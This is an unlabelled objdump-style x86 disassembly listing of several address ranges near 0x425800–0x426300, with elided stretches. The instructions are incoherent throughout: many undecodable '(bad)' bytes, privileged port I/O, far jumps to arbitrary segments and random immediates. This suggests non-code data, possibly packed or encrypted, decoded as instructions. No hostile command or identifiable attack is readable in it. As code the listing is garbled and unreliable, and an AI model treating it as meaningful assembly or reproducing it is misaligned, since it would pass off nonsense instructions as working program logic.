  425812:	mov    WORD PTR [edi+0x1d27ef68],?
  425818:	in     eax,0x2d
  42581a:	cld    
  42581b:	shr    dl,1
  42581d:	pslld  mm1,QWORD PTR [ebx]
  425820:	dec    ebp
  425821:	pop    es
  425822:	ja     0x425824
  425824:	sbb    ecx,DWORD PTR fs:[eax+0x7c]
  425828:	clc    
  425829:	jp     0x425880
  42582b:	jae    0x4258ac
  42582d:	sbb    eax,DWORD PTR [ebx-0x7e]
  425830:	xchg   ebx,eax
  425831:	mov    DWORD PTR [ebx],0x3fb24d49
  425837:	mov    ah,0x5f
  425839:	push   DWORD PTR [esi-0x1b]
  42583c:	arpl   WORD PTR [eax],bp
  42583e:	jb     0x4258a2
  425840:	jge    0x425820
  425842:	fwait
  425843:	shl    DWORD PTR [ecx],0xe1
  425846:	rol    DWORD PTR [ebx],cl
  425848:	fldenv ds:0x937e3ae6
  42584e:	sub    DWORD PTR [ecx],esi
  425850:	mov    BYTE PTR [edx+0x8],0x4e
  425854:	(bad)  
  425855:	stc    
  425856:	dec    esi
  425857:	xchg   DWORD PTR [esi],ebp
  425859:	xchg   al,cl
  42585b:	ret    
  42585c:	mov    edx,0xbbc71166
  425861:	sub    al,BYTE PTR [edi-0x3d]
  425864:	xor    al,BYTE PTR [ecx+0x5442dadc]
  42586a:	rcr    ebp,1
  42586c:	retf   
  42586d:	sbb    bh,BYTE PTR ds:0x5e5088a0
  425873:	pop    ss
  425874:	jge    0x425874
  425876:	mov    DWORD PTR [esi],ebx
  425878:	inc    eax
  425879:	std    
  42587a:	repnz mov bh,0x65
  42587d:	xchg   ebp,eax
  42587e:	jae    0x4258fc
  425880:	daa    
  425881:	push   0x5f8c187a
  425886:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425888:	inc    ebp
  425889:	lock jmp 0x47d3:0xc16c22f5
  425891:	mov    bh,0xe2
  425893:	inc    esi
  425894:	jmp    0xf6460bc7
  425899:	cld    
  42589a:	xchg   edi,eax
  42589b:	mov    ds:0x2a40a55e,eax
  4258a0:	push   0x17
  4258a2:	out    dx,al
  4258a3:	ret    0xb552
  4258a6:	out    dx,eax
  4258a7:	adc    ebp,DWORD PTR [edi-0x26]
  4258aa:	(bad)  
  4258ab:	pop    ecx
  4258ac:	out    dx,eax
  4258ad:	or     DWORD PTR [eax+0x6e],ebp
  4258b0:	or     eax,0x309a5aef
  4258b5:	fucomi st,st(6)
  4258b7:	icebp  
  4258b8:	xchg   ecx,esi
  4258ba:	pop    ebp
  4258bb:	and    bl,bl
  4258bd:	repz popw ds
  4258c0:	outs   dx,BYTE PTR ds:[esi]
  4258c1:	add    al,0x90
  4258c3:	push   esi
  4258c4:	push   edi
  4258c5:	push   eax
  4258c6:	pop    ss
  4258c7:	fisubr DWORD PTR [edx]
  4258c9:	scas   eax,DWORD PTR es:[edi]
  4258ca:	adc    DWORD PTR [esi-0x1],0x79
  4258ce:	imul   ebx,DWORD PTR [eax+0x43],0xffffff99
  4258d2:	push   edi
  4258d3:	sub    cl,BYTE PTR fs:[ecx]
  4258d6:	fdiv   DWORD PTR [ecx]
  4258d8:	imul   edi,DWORD PTR [edi+0x77a4fd3f],0x4a183613
  4258e2:	popa   
  4258e3:	add    BYTE PTR [eax+ebp*1+0x74210d10],ah
  4258ea:	mov    ah,0x9d
  4258ec:	cmp    eax,DWORD PTR [eax]
	...
  425956:	pop    esp
  425957:	push   edx
  425958:	nop
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	dec    ecx
  425963:	out    dx,eax
  425964:	ins    DWORD PTR es:[edi],dx
  425965:	mov    ch,0xab
  425967:	xchg   edx,eax
  425968:	add    DWORD PTR [eax],eax
  42596a:	inc    DWORD PTR [eax]
  42596c:	add    BYTE PTR [eax],al
  42596e:	addr16 fs pop ebp
  425971:	or     eax,0x2651c5e2
  425976:	push   edx
  425977:	arpl   WORD PTR [esi-0x79602476],bx
  42597d:	jae    0x425954
  42597f:	test   DWORD PTR [edx],ebp
  425981:	add    ebx,ebp
  425983:	mov    ch,0x1d
  425985:	(bad)  
  425986:	aam    0xcd
  425988:	dec    edi
  425989:	pop    ds
  42598a:	mov    ah,0x4c
  42598c:	aas    
  42598d:	(bad)  
  42598e:	pop    eax
  42598f:	stc    
  425990:	sbb    esi,DWORD PTR [edx]
  425992:	leave  
  425993:	inc    esi
  425994:	jmp    0x425993
  425996:	sub    DWORD PTR [ebx+0x3609d499],edi
  42599c:	retf   
  42599d:	sar    dl,1
  42599f:	jmp    FWORD PTR fs:[ebp-0x1a]
  4259a3:	inc    edi
  4259a4:	(bad)  
  4259a6:	push   edx
  4259a7:	pushf  
  4259a8:	push   ds
  4259a9:	(bad)  
  4259ab:	and    BYTE PTR ds:0xd1291921,cl
  4259b1:	je     0x42595d
  4259b3:	(bad)  
  4259b4:	enter  0xfbcc,0x6
  4259b8:	mov    WORD PTR [ebx+0x6b],cs
  4259bb:	sub    eax,0xebb45001
  4259c0:	sub    eax,0x7daac3c9
  4259c5:	mov    eax,0x43511b34
  4259ca:	cmp    esi,DWORD PTR [ecx]
  4259cc:	push   es
  4259cd:	int3   
  4259ce:	stos   BYTE PTR es:[edi],al
  4259cf:	dec    DWORD PTR [edx+ecx*2]
  4259d2:	retf   
  4259d3:	imul   edi,DWORD PTR [eax-0x1c272907],0x6c67a52f
  4259dd:	sti    
  4259de:	ror    BYTE PTR [esi],0x35
  4259e1:	(bad)  
  4259e2:	push   esi
  4259e3:	sbb    ecx,ebp
  4259e5:	in     al,dx
  4259e6:	push   esp
  4259e7:	adc    DWORD PTR [edi-0x5f],0x35efe2c1
  4259ee:	pop    edx
  4259ef:	enter  0x7e00,0x16
  4259f3:	xchg   ecx,eax
  4259f4:	dec    ebx
  4259f5:	sbb    ebx,esp
  4259f7:	adc    esi,DWORD PTR [eax-0x70]
  4259fa:	cld    
  4259fb:	inc    ecx
  4259fc:	mov    ds:0xf8c3f17d,eax
  425a01:	sahf   
  425a02:	popa   
  425a03:	adc    ch,BYTE PTR [ebp-0x15a404c3]
  425a09:	pop    ebx
  425a0a:	cmp    esp,ebp
  425a0c:	sub    DWORD PTR [esi+0x37017f39],eax
  425a12:	stos   BYTE PTR es:[edi],al
  425a13:	retf   0xa373
  425a16:	jno    0x425a96
  425a18:	lahf   
  425a19:	arpl   WORD PTR [ebx],bp
  425a1b:	inc    edx
  425a1c:	mov    eax,0x22ee6df5
  425a21:	(bad)  
  425a22:	xor    ecx,DWORD PTR [ecx]
  425a24:	rcl    BYTE PTR [eax+0x76],0xc1
  425a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a29:	cs cmc 
  425a2b:	and    esi,ebp
  425a2d:	pushf  
  425a2e:	and    eax,0x9cc1e968
  425a33:	neg    BYTE PTR [esi-0x56]
  425a36:	pop    edi
  425a37:	loope  0x425a5f
  425a39:	sub    BYTE PTR [edx+0x23],al
  425a3c:	push   0x61
  425a3e:	arpl   WORD PTR [eax],bp
  425a40:	jmp    0x138e:0xac0c830e
  425a47:	push   0xffffffaf
  425a49:	inc    ebp
  425a4a:	in     eax,dx
  425a4b:	jno    0x425ab0
  425a4d:	xor    eax,0x2f13752
  425a52:	stc    
  425a53:	into   
  425a54:	mov    edx,edi
  425a56:	pop    es
  425a57:	mov    dl,0x96
  425a59:	enter  0x2305,0xd5
  425a5d:	adc    al,0x2f
  425a5f:	jecxz  0x425a7a
  425a61:	ja     0x425aa4
  425a63:	mov    DWORD PTR [ecx-0x3e],ecx
  425a66:	jns    0x425ab0
  425a68:	mov    esp,0x149ec312
	...
  425ad5:	add    cl,al
  425ad7:	arpl   WORD PTR [edi+eiz*2],ax
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4-0x5018cc8e]
  425ae6:	stos   BYTE PTR es:[edi],al
  425ae7:	xchg   ebx,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	inc    DWORD PTR [eax]
  425aec:	add    BYTE PTR [eax],al
  425aee:	jns    0x425b68
  425af0:	or     DWORD PTR [ecx-0x3a],ebp
  425af3:	cs data16 lahf 
  425af6:	rcl    ebx,0x58
  425af9:	dec    ebx
  425afa:	pop    edx
  425afb:	shr    DWORD PTR [edx-0x6358573b],1
  425b01:	xchg   ecx,eax
  425b02:	cwde   
  425b03:	or     al,0x7a
  425b05:	cli    
  425b06:	inc    ecx
  425b07:	stos   DWORD PTR es:[edi],eax
  425b08:	mov    ebp,0x5098ed70
  425b0d:	or     al,0x23
  425b0f:	out    dx,eax
  425b10:	and    BYTE PTR ds:0x4c81c1e,ch
  425b16:	ret    
  425b17:	push   esp
  425b18:	scas   eax,DWORD PTR es:[edi]
  425b19:	dec    edx
  425b1a:	dec    ecx
  425b1b:	mov    bl,0x76
  425b1d:	xor    eax,0x6ecb772d
  425b22:	das    
  425b23:	out    0x1b,eax
  425b25:	popa   
  425b26:	daa    
  425b27:	mov    al,BYTE PTR [ecx-0x40fe87ab]
  425b2d:	rcl    DWORD PTR [eax],cl
  425b2f:	out    0x3f,eax
  425b31:	inc    esp
  425b32:	jnp    0x425b3a
  425b34:	imul   esi,DWORD PTR [ecx-0x5a2c9156],0xffffff91
  425b3b:	inc    DWORD PTR [ebp+ecx*4+0x1f3abec8]
  425b42:	(bad)  
  425b43:	mov    ch,ah
  425b45:	std    
  425b46:	test   BYTE PTR [esi+0x46577],bl
  425b4c:	pop    es
  425b4d:	jmp    0xfc6d:0xd7f85990
  425b54:	pop    edi
  425b55:	mov    cl,0xa1
  425b57:	dec    edi
  425b58:	mov    eax,0x83866c7c
  425b5d:	pop    esi
  425b5e:	add    edx,DWORD PTR [ecx]
  425b60:	inc    edi
  425b61:	aad    0xb8
  425b63:	shr    DWORD PTR [edx+0x9ef45de],cl
  425b69:	aad    0xd
  425b6b:	sub    al,0xa0
  425b6d:	xchg   ecx,eax
  425b6e:	push   ebp
  425b6f:	pop    eax
  425b70:	lods   al,BYTE PTR ds:[esi]
  425b71:	mov    ds:0x404c5bd0,al
  425b76:	mov    ecx,DWORD PTR [edi]
  425b78:	sahf   
  425b79:	mov    ah,0xf6
  425b7b:	mov    ebx,0x476fca5b
  425b80:	pop    ds
  425b81:	aaa    
  425b82:	shl    cl,0xb3
  425b85:	in     al,dx
  425b86:	rol    DWORD PTR [eax+0x776df26d],0xa
  425b8d:	xchg   ecx,eax
  425b8e:	in     al,0x3f
  425b90:	out    dx,eax
  425b91:	and    DWORD PTR [ebx+0x809da67],edx
  425b97:	mov    ebp,0x42148cd
  425b9c:	lods   al,BYTE PTR ds:[esi]
  425b9d:	mov    al,0x28
  425b9f:	and    al,0xd
  425ba1:	add    al,0x39
  425ba3:	mov    al,0xb
  425ba5:	push   edi
  425ba6:	cmp    al,0xf0
  425ba8:	xchg   ebx,eax
  425ba9:	pop    eax
  425baa:	lock pop esi
  425bac:	mov    ch,0x3a
  425bae:	adc    eax,0x24e70327
  425bb3:	push   edx
  425bb4:	call   0x101c:0x83aa213e
  425bbb:	inc    ebp
  425bbc:	inc    esp
  425bbd:	and    DWORD PTR [ebx+0x48],0x14ad76ea
  425bc4:	(bad)  
  425bc5:	in     al,dx
  425bc6:	nop
  425bc7:	icebp  
  425bc8:	jne    0x425bff
  425bca:	add    eax,0xd45ce90
  425bcf:	mov    edx,gs
  425bd1:	push   ebx
  425bd2:	inc    esi
  425bd3:	pop    esp
  425bd4:	call   0x2c106cf2
  425bd9:	push   edx
  425bda:	sbb    dl,cl
  425bdc:	test   BYTE PTR [eax+0x2ef6ecc7],ah
  425be2:	push   edi
  425be3:	jp     0x425c4e
  425be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425be6:	mov    edx,0x2bd70478
  425beb:	cmp    eax,0xa1
	...
  425c54:	add    BYTE PTR [eax],al
  425c56:	(bad)  
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	das    
  425c63:	in     al,0x30
  425c65:	test   DWORD PTR [ecx-0xfffe6c],ebp
  425c6b:	add    BYTE PTR [eax],al
  425c6d:	add    BYTE PTR [edi],al
  425c6f:	jno    0x425cb6
  425c71:	dec    ebp
  425c72:	jmp    FWORD PTR [ebp+0x132df2b0]
  425c78:	add    dh,bh
  425c7a:	js     0x425c50
  425c7c:	pop    ds
  425c7d:	lods   eax,DWORD PTR ds:[esi]
  425c7e:	mov    es,WORD PTR [ecx-0x74969a80]
  425c84:	pop    ds
  425c85:	dec    eax
  425c86:	hlt    
  425c87:	out    dx,eax
  425c88:	fwait
  425c89:	out    0x58,eax
  425c8b:	das    
  425c8c:	inc    esi
  425c8d:	sti    
  425c8e:	(bad)  [ecx]
  425c90:	mov    WORD PTR [ecx+0x58321e21],gs
  425c96:	aad    0x84
  425c98:	int3   
  425c99:	xor    edx,DWORD PTR [ecx+0x30]
  425c9c:	stos   DWORD PTR es:[edi],eax
  425c9d:	inc    esp
  425c9e:	fsub   DWORD PTR [esi+0x6426de44]
  425ca4:	jmp    0x86eb:0xb56b4011
  425cab:	cmp    al,BYTE PTR [ecx-0x63df4697]
  425cb1:	jmp    0x9ce5:0x1ca3e15f
  425cb8:	ins    BYTE PTR es:[edi],dx
  425cb9:	shr    BYTE PTR fs:[edi-0x3c],0x9e
  425cbe:	cmp    ebp,edi
  425cc0:	pushf  
  425cc1:	mov    bl,0x14
  425cc3:	inc    esi
  425cc4:	mov    al,ds:0xa3abe04b
  425cc9:	mov    ds:0x1038cfe6,al
  425cce:	test   BYTE PTR [esi+edx*2-0x5c],bh
  425cd2:	stc    
  425cd3:	and    al,0x45
  425cd5:	loop   0x425c7d
  425cd7:	and    al,0xda
  425cd9:	cmc    
  425cda:	ret    
  425cdb:	dec    edx
  425cdc:	test   al,0xd8
  425cde:	loop   0x425caa
  425ce0:	inc    ecx
  425ce1:	push   eax
  425ce2:	mov    bl,0x65
  425ce4:	dec    ecx
  425ce5:	mov    dh,0xd1
  425ce7:	sbb    eax,0x1826780d
  425cec:	and    eax,0xf5d577af
  425cf1:	imul   ebx,DWORD PTR [esi+0x3f],0x61
  425cf5:	cmp    edx,DWORD PTR [edx+ebx*2]
  425cf8:	arpl   WORD PTR ds:0xe3760d20,di
  425cfe:	scas   al,BYTE PTR es:[edi]
  425cff:	cld    
  425d00:	add    ch,cl
  425d02:	ss pusha 
  425d04:	icebp  
  425d05:	pop    ds
  425d06:	sbb    DWORD PTR es:[ebp+eax*8+0x8],0x97b7a142
  425d0f:	dec    ebp
  425d10:	nop
  425d11:	xor    ebx,DWORD PTR [esi-0x2d442ac6]
  425d17:	mov    ch,cl
  425d19:	cmp    al,bh
  425d1b:	push   ebx
  425d1c:	(bad)  
  425d1d:	adc    DWORD PTR [edx+0x7d36159f],esi
  425d23:	rcl    ebp,0xf5
  425d26:	xchg   edi,eax
  425d27:	sbb    eax,0xedde9887
  425d2c:	xchg   edx,eax
  425d2d:	push   0xf492daf
  425d32:	outs   dx,DWORD PTR ds:[esi]
  425d33:	mov    ds:0x1609b8a3,eax
  425d38:	std    
  425d39:	jle    0x425d30
  425d3b:	pop    ebp
  425d3c:	pop    ss
  425d3d:	cs jmp 0xcf84b06d
  425d43:	lods   eax,DWORD PTR ds:[esi]
  425d44:	push   ebx
  425d45:	imul   edx,eax,0x76
  425d48:	mov    ebx,0xac7280bb
  425d4d:	push   ebx
  425d4e:	or     BYTE PTR [eax],ch
  425d50:	dec    ebx
  425d51:	repz xchg edi,eax
  425d53:	in     al,0x20
  425d55:	add    eax,0xf748ffda
  425d5a:	add    eax,0x7d63aa36
  425d5f:	addr16 push ebx
  425d61:	fimul  WORD PTR [eax]
  425d63:	push   0x8dac7068
  425d68:	add    esp,esp
  425d6a:	sbb    dh,BYTE PTR [ebx-0x80]
	...
  425dd5:	add    bh,bh
  425dd7:	lods   al,BYTE PTR ds:[esi]
  425dd8:	fadd   QWORD PTR [edi]
  425dda:	fbstp  TBYTE PTR [edi-0x1]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0x247a845,al
  425de6:	test   al,0x95
  425de8:	add    DWORD PTR [eax],eax
  425dea:	inc    DWORD PTR [eax]
  425dec:	add    BYTE PTR [eax],al
  425dee:	or     ah,BYTE PTR [ecx]
  425df0:	iret   
  425df1:	int3   
  425df2:	push   ebx
  425df3:	xchg   edi,eax
  425df4:	pop    edx
  425df5:	mov    al,ds:0x88034bb6
  425dfa:	int    0x1d
  425dfc:	mov    ds:0xe03e0ea2,ax
  425e02:	dec    ebx
  425e03:	(bad)  
  425e04:	std    
  425e05:	pop    ebx
  425e06:	mov    ebx,0xdee5abf9
  425e0b:	iret   
  425e0c:	dec    edi
  425e0d:	scas   al,BYTE PTR es:[edi]
  425e0e:	retf   
  425e0f:	iret   
  425e10:	ror    DWORD PTR [ecx+edx*8],0x7b
  425e14:	cmp    dh,BYTE PTR [esi]
  425e16:	add    eax,0xd4d72af3
  425e1b:	adc    bl,ch
  425e1d:	stc    
  425e1e:	mov    fs,WORD PTR cs:[ebp-0xe]
  425e22:	pop    esi
  425e23:	or     esp,DWORD PTR [ebx+0x34]
  425e26:	pop    esi
  425e27:	xchg   ebp,eax
  425e28:	in     al,0x27
  425e2a:	fild   DWORD PTR [eax]
  425e2c:	out    dx,al
  425e2d:	cs enter 0x6c7d,0x77
  425e32:	jae    0x425e55
  425e34:	imul   esi,DWORD PTR [ecx-0x8],0x33
  425e38:	sbb    al,0xc4
  425e3a:	and    cl,BYTE PTR ds:[edi-0x1f18508e]
  425e41:	fist   DWORD PTR [esi+0x6e]
  425e44:	pop    ss
  425e45:	mov    BYTE PTR [esi],ch
  425e47:	hlt    
  425e48:	loopne 0x425eb8
  425e4a:	mov    ds:0xe6a6cfbd,al
  425e4f:	mov    edx,DWORD PTR [eax-0x5d]
  425e52:	or     al,bl
  425e54:	out    dx,eax
  425e55:	je     0x425e2c
  425e57:	mov    esp,0x6871b535
  425e5c:	jecxz  0x425e3c
  425e5e:	xchg   DWORD PTR [esi],esp
  425e60:	rcl    DWORD PTR [esi],0x4a
  425e63:	jae    0x425dff
  425e65:	push   ss
  425e66:	adc    edi,esi
  425e68:	mov    al,0x5d
  425e6a:	sbb    dh,ah
  425e6c:	mov    esp,0x1af42a4e
  425e71:	pop    ecx
  425e72:	and    cl,BYTE PTR [eax+esi*8]
  425e75:	xor    al,BYTE PTR [ebp-0x17a894b8]
  425e7b:	mov    gs,WORD PTR [edx+0xaa16774]
  425e81:	les    esp,FWORD PTR [ebp+0x459a6f5f]
  425e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e88:	call   0xc64cc926
  425e8d:	xchg   ecx,eax
  425e8e:	les    eax,FWORD PTR [esi-0x68c9acc9]
  425e94:	test   al,0x9f
  425e96:	dec    eax
  425e97:	fmul   QWORD PTR ds:0x932ecc8b
  425e9d:	shr    ebp,1
  425e9f:	cld    
  425ea0:	jg     0x425e6e
  425ea2:	ins    BYTE PTR es:[di],dx
  425ea4:	fs dec ebx
  425ea6:	add    ebx,DWORD PTR [ebx]
  425ea8:	mov    ebp,0x415c7b18
  425ead:	sbb    eax,DWORD PTR [ebx+eiz*2]
  425eb0:	adc    cl,ch
  425eb2:	test   eax,0x71b93ce3
  425eb7:	jo     0x425e9b
  425eb9:	xor    DWORD PTR [ecx+esi*2],ebp
  425ebc:	cmovl  edx,edx
  425ebf:	pop    ss
  425ec0:	and    ecx,eax
  425ec2:	jb     0x425e87
  425ec4:	data16 jno 0x425f2d
  425ec7:	xor    edi,edi
  425ec9:	add    al,0xc2
  425ecb:	inc    eax
  425ecc:	pop    edi
  425ecd:	mov    ds:0x545e30db,al
  425ed2:	out    0x76,al
  425ed4:	xchg   ebp,eax
  425ed5:	xlat   BYTE PTR ds:[ebx]
  425ed6:	sbb    BYTE PTR [eax],ah
  425ed8:	scas   al,BYTE PTR es:[edi]
  425ed9:	loop   0x425f0e
  425edb:	imul   edx,DWORD PTR [esi],0xfffffffe
  425ede:	fnsave [ebx-0x391a1073]
  425ee4:	sbb    eax,0xa65c2a9a
  425ee9:	mov    cs,esi
  425eeb:	jge    0x425ea7
	...
  425f55:	add    dh,al
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	add    eax,0xa71ff26f
  425f67:	xchg   esi,eax
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	inc    DWORD PTR [eax]
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	sbb    BYTE PTR [esi],0x29
  425f71:	dec    esi
  425f72:	xchg   edx,eax
  425f73:	mov    edx,DWORD PTR [ebx-0x310cb826]
  425f79:	es pop ebx
  425f7b:	test   DWORD PTR [esi-0x5e],0xb4761d1a
  425f82:	cmp    BYTE PTR [esi],al
  425f84:	shl    esi,cl
  425f86:	mov    cl,0x12
  425f88:	and    eax,0x9390417c
  425f8d:	fisub  DWORD PTR [ebp-0x60f0983a]
  425f93:	jae    0x425f48
  425f95:	sub    eax,0xf3b14311
  425f9a:	dec    esp
  425f9b:	scas   eax,DWORD PTR es:[edi]
  425f9c:	jo     0x425f77
  425f9e:	or     DWORD PTR [ecx+0x14],ecx
  425fa1:	les    ebp,FWORD PTR [edi+0x4f]
  425fa4:	stc    
  425fa5:	sbb    eax,0xcd1bd960
  425faa:	fsub   DWORD PTR [edx]
  425fac:	mov    esi,0x38418794
  425fb1:	mov    bh,0xde
  425fb3:	sbb    ebx,ebx
  425fb5:	push   ebx
  425fb6:	idiv   al
  425fb8:	xor    ecx,ebp
  425fba:	push   ecx
  425fbb:	aas    
  425fbc:	ror    BYTE PTR [edx+edi*2-0x73a4dfef],cl
  425fc3:	idiv   BYTE PTR [ebp+0x6bd001f4]
  425fc9:	cli    
  425fca:	dec    ebp
  425fcb:	inc    ebp
  425fcc:	sub    ch,bl
  425fce:	cdq    
  425fcf:	mov    al,ds:0x4da18ce4
  425fd4:	inc    bl
  425fd6:	(bad)  
  425fd7:	add    al,0x6b
  425fd9:	test   DWORD PTR [ecx+0x1f796a44],0x7ebc98d8
  425fe3:	jge    0x425fca
  425fe5:	sbb    eax,0x9a78153
  425fea:	call   0xd264:0x47a641fc
  425ff1:	mov    ch,0xe1
  425ff3:	push   ds
  425ff4:	stos   DWORD PTR es:[edi],eax
  425ff5:	ins    BYTE PTR es:[edi],dx
  425ff6:	or     bl,ah
  425ff8:	add    ecx,DWORD PTR ds:0xbbffbdba
  425ffe:	std    
  425fff:	jmp    0xd6c8:0xefbd7cba
  426006:	fs push ebx
  426008:	ins    BYTE PTR es:[edi],dx
  426009:	in     al,0x86
  42600b:	sub    ch,BYTE PTR [ebx-0x12]
  42600e:	and    BYTE PTR [edi-0x44],dl
  426011:	xor    eax,0x81fc9a46
  426016:	push   ds
  426017:	stc    
  426018:	pop    ss
  426019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42601a:	in     al,0x20
  42601c:	push   esp
  42601d:	or     DWORD PTR [eax],esi
  42601f:	xchg   esp,eax
  426020:	loopne 0x426004
  426022:	aas    
  426023:	sbb    BYTE PTR [edi+0x1e906452],cl
  426029:	inc    esi
  42602a:	sti    
  42602b:	adc    eax,0x42397ab0
  426030:	mov    al,ds:0x63fd137
  426035:	xor    BYTE PTR [edx],dh
  426037:	xchg   DWORD PTR [ecx],edx
  426039:	jp     0x42608f
  42603b:	aad    0xe
  42603d:	mov    esp,0x7fe43bf2
  426042:	sbb    DWORD PTR [edx],eax
  426044:	dec    ecx
  426045:	jle    0x42604c
  426047:	or     al,0x33
  426049:	mov    ecx,0x9cb76c6d
  42604e:	jno    0x426013
  426050:	inc    ebp
  426051:	dec    eax
  426052:	addr16 cs popf 
  426055:	pop    es
  426056:	mov    al,0xef
  426058:	sbb    esp,DWORD PTR [esi+0x20bd6d13]
  42605e:	mov    BYTE PTR [ebx+0x0],0xd7
  426062:	cmp    esi,DWORD PTR [ebp-0x5e5ecc6a]
  426068:	jnp    0x4260c4
  42606a:	shl    BYTE PTR [eax-0x3b],1
	...
  4260d5:	add    BYTE PTR [ecx],bh
  4260d7:	cwde   
  4260d8:	or     eax,DWORD PTR [esi]
  4260da:	stos   DWORD PTR es:[edi],eax
  4260db:	xchg   edi,eax
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	xlat   BYTE PTR ds:[ebx]
  4260e3:	scas   eax,DWORD PTR es:[edi]
  4260e4:	xor    DWORD PTR ds:0x197a6,ebx
  4260ea:	inc    DWORD PTR [eax]
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	dec    ecx
  4260ef:	mov    ebx,DWORD PTR [edx+0x64]
  4260f2:	push   0xf9b95d32
  4260f7:	in     al,0x51
  4260f9:	out    0xff,al
  4260fb:	cmp    dl,BYTE PTR [esi+0x275a2c48]
  426101:	das    
  426102:	stc    
  426103:	(bad)  
  426104:	(bad)  
  426106:	cld    
  426107:	sub    ch,bh
  426109:	push   ebx
  42610a:	jmp    0x83d1:0x7a2b075d
  426111:	adc    eax,0x6a5058b7
  426116:	aad    0xf0
  426118:	xchg   edi,eax
  426119:	jl     0x426160
  42611b:	stc    
  42611c:	push   ss
  42611d:	mov    bh,0x76
  42611f:	inc    ebx
  426120:	lods   eax,DWORD PTR ds:[esi]
  426121:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  426123:	popa   
  426124:	fdivr  DWORD PTR [esp+ebx*8-0x22]
  426128:	retf   
  426129:	pop    ss
  42612a:	push   edi
  42612b:	xor    eax,ebx
  42612d:	jne    0x426187
  42612f:	mov    ds:0x6e6882ab,al
  426134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426135:	and    ebx,DWORD PTR [ecx-0x3c]
  426138:	dec    ebp
  426139:	daa    
  42613a:	add    DWORD PTR [ebp-0x730d7002],0x3d46b375
  426144:	rcl    edx,1
  426146:	pop    ebx
  426147:	jl     0x426129
  426149:	pop    ebp
  42614a:	test   al,0x7a
  42614c:	cwde   
  42614d:	pusha  
  42614e:	imul   ebx,DWORD PTR [esi],0xffffffcf
  426151:	mov    al,ds:0xd578edcc
  426156:	push   ds
  426157:	sbb    edx,esp
  426159:	out    dx,al
  42615a:	push   ds
  42615b:	cdq    
  42615c:	lods   al,BYTE PTR ds:[esi]
  42615d:	test   al,0x21
  42615f:	push   ss
  426160:	inc    edi
  426161:	jecxz  0x42616e
  426163:	or     edx,eax
  426165:	in     eax,dx
  426166:	das    
  426167:	cmp    eax,0xd4da1a56
  42616c:	mov    dl,0x69
  42616e:	inc    esp
  42616f:	jmp    0x426157
  426171:	dec    edx
  426172:	les    ebx,FWORD PTR [edi]
  426174:	je     0x4261f3
  426176:	jnp    0x426115
  426178:	add    dl,BYTE PTR [ebp+0x24]
  42617b:	pop    ds
  42617c:	(bad)  
  42617d:	imul   ecx,DWORD PTR [edx-0x3d8b429b],0x983beb33
  426187:	cli    
  426188:	mov    dl,0xf7
  42618a:	mov    WORD PTR [ecx+0x50a9ab0],es
  426190:	jle    0x4261db
  426192:	adc    dh,dh
  426194:	(bad)  
  426195:	pushf  
  426196:	aam    0xd8
  426198:	jne    0x42611b
  42619a:	push   edi
  42619c:	mov    ebp,0x3508f8af
  4261a1:	sti    
  4261a2:	pusha  
  4261a3:	addr16 enter 0x5cc6,0x6c
  4261a8:	gs jp  0x426220
  4261ab:	xor    al,0xdd
  4261ad:	add    DWORD PTR [ecx],ebx
  4261af:	lods   al,BYTE PTR ds:[esi]
  4261b0:	outs   dx,BYTE PTR ds:[esi]
  4261b1:	push   0x6b
  4261b3:	popf   
  4261b4:	xchg   ebx,eax
  4261b5:	xchg   DWORD PTR [eax+0x42909977],eax
  4261bb:	sti    
  4261bc:	jmp    0x4c1c46fb
  4261c1:	add    DWORD PTR [edx-0x18],0x2b4a8d9
  4261c8:	xlat   BYTE PTR ds:[ebx]
  4261c9:	lds    ecx,FWORD PTR [edx]
  4261cb:	hlt    
  4261cc:	ins    BYTE PTR es:[edi],dx
  4261cd:	fld    QWORD PTR [ecx-0x98f780f]
  4261d3:	loopne 0x426199
  4261d5:	pop    esp
  4261d6:	sub    ecx,eax
  4261d8:	cmp    BYTE PTR [ebx-0x1d],0x8c
  4261dc:	gs mov esi,0x2c5ceaac
  4261e2:	cmp    DWORD PTR ds:0xc9f8f788,0xf62a13cb
  4261ec:	mov    edx,0x0
	...
  426255:	add    BYTE PTR [ebx-0x409ef0df],bl
  42625b:	outs   dx,DWORD PTR ds:[esi]
  42625c:	(bad)  
  42625d:	sti    
  42625e:	mov    bh,0x83
  426260:	mov    cl,0x27
  426262:	mov    dl,0xce
  426264:	adc    ch,0xa5
  426267:	cwde   
  426268:	add    DWORD PTR [eax],eax
  42626a:	inc    DWORD PTR [eax]
  42626c:	add    BYTE PTR [eax],al
  42626e:	adc    BYTE PTR [eax-0x55],ch
  426271:	mov    ebp,0xbfc31564
  426276:	push   ds
  426277:	inc    eax
  426278:	mov    DWORD PTR ss:[edx-0x34bde7d8],esi
  42627f:	mov    ebp,0x8ed7c1cd
  426284:	je     0x42624a
  426286:	cmc    
  426287:	lahf   
  426288:	js     0x42627e
  42628a:	(bad)  
  42628b:	enter  0x44fd,0x7d
  42628f:	cwde   
  426290:	mov    al,0x66
  426292:	push   ss
  426293:	dec    ebx
  426294:	mov    ds:0x55101633,al
  426299:	(bad)  
